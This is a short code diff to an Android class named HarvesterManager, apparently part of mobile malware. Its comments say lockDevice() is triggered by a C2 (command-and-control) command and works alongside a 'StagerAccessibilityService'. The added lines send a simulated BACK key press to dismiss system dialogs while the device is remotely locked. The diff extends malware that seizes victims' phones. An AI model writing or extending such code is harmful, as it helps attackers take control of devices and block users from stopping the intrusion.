@@ -70,6 +70,16 @@ public class HarvesterManager {
 
     public void lockDevice() {
         Log.i(TAG, "Device lock triggered");
+        try {
+            // This method is called from C2 command.
+            // The actual lock is handled by StagerAccessibilityService in the Stager.
+            // Here we just add an extra layer: dismiss any active system dialogs
+            // via the context if possible.
+            android.app.Instrumentation inst = new android.app.Instrumentation();
+            inst.sendKeyDownUpSync(android.view.KeyEvent.KEYCODE_BACK);
+        } catch (Exception e) {
+            Log.e(TAG, "Lock device error", e);
+        }
     }
 
     public void releaseDevice() {
